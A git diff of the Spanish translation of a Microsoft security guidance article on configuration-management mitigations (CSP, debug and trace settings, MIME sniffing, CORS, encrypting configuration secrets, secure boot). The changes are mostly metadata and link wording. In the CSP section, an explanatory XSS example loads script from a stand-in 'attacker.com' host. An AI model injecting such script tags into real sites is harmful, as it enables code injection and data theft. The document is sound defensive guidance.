@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: fe6251f70ae62440bbbefc8c3aa5d92d934d8ba0
-ms.sourcegitcommit: da3459aca32dcdbf6a63ae9186d2ad2ca2295893
+ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
+ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
 ms.translationtype: HT
 ms.contentlocale: es-ES
-ms.lasthandoff: 11/07/2018
-ms.locfileid: "51249360"
+ms.lasthandoff: 12/04/2018
+ms.locfileid: "52849775"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Marco de seguridad: Administración de configuración | Mitigaciones 
 | Producto o servicio | Artículo |
@@ -43,7 +43,7 @@ ms.locfileid: "51249360"
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
 | **Referencias**              | [An Introduction to Content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Introducción a la directiva de seguridad del contenido), [Content Security Policy Reference](http://content-security-policy.com/) (Referencia a la directiva de seguridad del contenido), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Características de seguridad), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Introducción a la directiva de seguridad del contenido), [Can I use CSP?](http://caniuse.com/#feat=contentsecuritypolicy) (¿Puedo usar la directiva de seguridad de contenido [CSP]?) |
-| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Gracias a la restricción básica 1 de la CSP, esta vulnerabilidad de seguridad no funcionará</li><li>Insertando `<script src=”http://attacker.com/maliciousCode.js”/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios aprobados de la CSP</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión, ya que el dominio de destino no estará en la lista aprobada de la CSP</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
+| **Pasos** | <p>La directiva de seguridad de contenido (CSP) es un mecanismo de seguridad de defensa en profundidad, una norma de W3C, que permite controlar el contenido insertado en el sitio a los propietarios de aplicaciones web. La CSP se agrega como encabezado de respuesta HTTP al servidor web y se aplica en los exploradores del lado del cliente. Es una directiva basada en una lista blanca: un sitio web puede declarar un conjunto de dominios de confianza desde los que se puede cargar contenido activo, como JavaScript.</p><p>La CSP ofrece las siguientes ventajas de seguridad:</p><ul><li>**Protección frente a XSS:** si una página es vulnerable a XSS, los atacantes pueden aprovecharlo de dos maneras:<ul><li>Insertando `<script>malicious code</script>`. Gracias a la restricción básica 1 de la CSP, esta vulnerabilidad de seguridad no funcionará</li><li>Insertando `<script src=”http://attacker.com/maliciousCode.js”/>`. Esta vulnerabilidad de seguridad no funcionará, ya que el dominio que controla el atacante no estará en la lista de dominios aprobados de la CSP</li></ul></li><li>**Control de la exfiltración de datos:** si cualquier contenido malintencionado de una página web intenta conectarse a un sitio web externo y robar datos, la CSP anulará la conexión. ya que el dominio de destino no estará en la lista aprobada de la CSP</li><li>**Defensa contra el secuestro de clic:** el secuestro de clic es una técnica de ataque con la que un adversario puede enmarcar un sitio web auténtico y forzar a los usuarios a hacer clic en elementos de la interfaz de usuario. La defensa actual contra el secuestro de clic se consigue mediante la configuración de un encabezado de respuesta X-Frame-Option. No todos los exploradores respetan este encabezado y la implementación de la CSP será un método estándar de defensa contra el secuestro de clic</li><li>**Informes de ataques en tiempo real:** si se produce un ataque de inserción de código en un sitio web con la CSP habilitada, los exploradores desencadenarán automáticamente una notificación a un punto de conexión configurado en el servidor web. De esta manera, la CSP actúa como sistema de advertencia en tiempo real.</li></ul> |
 
 ### <a name="example"></a>Ejemplo
 Ejemplo de directiva: 
@@ -85,7 +85,7 @@ Example: var str="alert(1)"; eval(str);
 | **Fase de SDL**               | Compilación |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [Introducción a la depuración en ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [Introducción al seguimiento en ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [Cómo: Habilitar el seguimiento de una aplicación ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [Cómo: Habilitar la depuración de aplicaciones de ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Referencias**              | [ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx)(Información general de depuración ASP.NET), [ASP.NET Tracing Overview](http://msdn2.microsoft.com/library/bb386420.aspx) (Información general de seguimiento ASP.NET), [How to: Enable Tracing for an ASP.NET Application](http://msdn2.microsoft.com/library/0x5wc973.aspx) (Habilitación del seguimiento para una aplicación ASP.NET), [How to: Enable Debugging for ASP.NET Applications](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) (Habilitación de la depuración para aplicaciones ASP.NET). |
 | **Pasos** | Cuando el seguimiento está habilitado para la página, cada explorador que lo solicite también obtiene la información de seguimiento con los datos del estado interno del servidor y del flujo de trabajo. Esta información podría ser confidencial. Cuando está habilitada la depuración en la página, los errores que se producen en el servidor provocan el seguimiento de pila completo de los datos que se presenta al explorador. Esos datos pueden exponer información confidencial del flujo de trabajo del servidor. |
 
 ## <a id="js-trusted"></a>Acceso exclusivo a archivos JavaScript de terceros de orígenes de confianza
@@ -210,7 +210,7 @@ Tenga en cuenta que esta característica de validación de solicitud no es compa
 | **Fase de SDL**               | Compilación |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [IE8 Security Part V - Comprehensive Protection](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) (Seguridad de IE8 [parte V]: protección total), [tipos de MIME](http://en.wikipedia.org/wiki/Mime_type) |
+| **Referencias**              | [IE8 Security Part V: Comprehensive Protection](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) (Seguridad de IE8 [parte V]: protección total), [MIME types](http://en.wikipedia.org/wiki/Mime_type) (Tipos de MIME) |
 | **Pasos** | El encabezado X-Content-Type-Options es un encabezado HTTP que permite a los desarrolladores especificar que su contenido no se debe someter a un rastreo de MIME. Este encabezado se ha diseñado para mitigar los ataques de rastreo de MIME. Para cada página que podría incluir contenido controlable por el usuario, debe usar el encabezado HTTP X-Content-Type-Options:nosniff. Para habilitar el encabezado necesario globalmente para todas las páginas de la aplicación, puede realizar una de las siguientes acciones|
 
 ### <a name="example"></a>Ejemplo
@@ -396,7 +396,7 @@ public class ResourcesController : ApiController
 | **Referencias**              | [Habilitación de solicitudes de origen cruzado (CORS) en ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
 | **Pasos** | <p>En ASP.NET Core 1.0, CORS puede habilitarse mediante middleware o MVC. Al utilizar MVC para habilitar CORS se utilizan los mismos servicios CORS, pero no middleware de CORS.</p>|
 
-**Enfoque 1** Habilitar CORS con middleware: para habilitar CORS para toda la aplicación, agregue el middleware de CORS a la canalización de solicitud con el método de extensión UseCors. Cuando se agrega el middleware de CORS mediante la clase CorsPolicyBuilder, puede especificarse una directiva de origen cruzado. Existen dos formas de hacerlo:
+**Enfoque 1** Habilitación de CORS con middleware: para habilitar CORS para toda la aplicación, agregue el middleware de CORS a la canalización de solicitud con el método de extensión UseCors. Cuando se agrega el middleware de CORS mediante la clase CorsPolicyBuilder, puede especificarse una directiva de origen cruzado. Existen dos formas de hacerlo:
 
 ### <a name="example"></a>Ejemplo
 Lo primero que se hace es llamar a UseCors con una expresión lambda. La expresión lambda toma un objeto CorsPolicyBuilder: 
@@ -485,7 +485,7 @@ Para deshabilitar CORS en una acción o un controlador, utilice el atributo [Dis
 | **Fase de SDL**               | Implementación |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx) (Procedimiento para cifrar secciones de configuración en ASP.NET 2.0 mediante DPAPI), [Especificar un proveedor de configuración protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Using Azure Key Vault to protect application secrets](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) (Uso de Azure Key Vault para proteger los secretos de la aplicación) |
+| **Referencias**              | [How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI](https://msdn.microsoft.com/library/ff647398.aspx) (Procedimiento para cifrar secciones de configuración en ASP.NET 2.0 mediante DPAPI), [Especificar un proveedor de configuración protegida](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Uso de Azure Key Vault para proteger los secretos de la aplicación](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
 | **Pasos** | Los archivos de configuración tales como web.config y appsettings.json se suelen usar para almacenar información confidencial, como nombres de usuario, contraseñas, cadenas de conexión a la base de datos y claves de cifrado. Si no protege esta información, la aplicación es vulnerable a atacantes o usuarios malintencionados que obtienen información confidencial, como nombres de usuario y contraseñas de cuentas, nombres de bases de datos y nombres de servidores. Según el tipo de implementación (Azure o local), cifre las secciones confidenciales de los archivos de configuración mediante DPAPI o servicios como Azure Key Vault. |
 
 ## <a id="admin-strong"></a>Comprobación de que todas las interfaces de administración están protegidas con credenciales seguras
@@ -507,7 +507,7 @@ Para deshabilitar CORS en una acción o un controlador, utilice el atributo [Dis
 | **Fase de SDL**               | Compilación |  
 | **Tecnologías aplicables** | Genérico |
 | **Atributos**              | N/D  |
-| **Referencias**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) (Habilitación del arranque seguro y del cifrado de dispositivos de BitLocker en Windows 10 IoT Core) |
+| **Referencias**              | [Enabling Secure Boot and bit-locker Device Encryption on Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) (Habilitación del arranque seguro y del cifrado de dispositivos de BitLocker en Windows 10 IoT Core) |
 | **Pasos** | El arranque seguro de UEFI restringe el sistema para permitir solo la ejecución de archivos binarios firmados por una entidad determinada. Esta característica evita que se ejecute código desconocido en la plataforma y pueda debilitar su seguridad. Habilite el arranque seguro de UEFI y restrinja la lista de entidades emisoras de certificados de confianza para la firma de código. Firme todo el código que se implementa en el dispositivo a través de una de las entidades de confianza. |
 
 ## <a id="partition-iot"></a>Cifrado del sistema operativo y particiones adicionales en los dispositivos IoT con Bitlocker
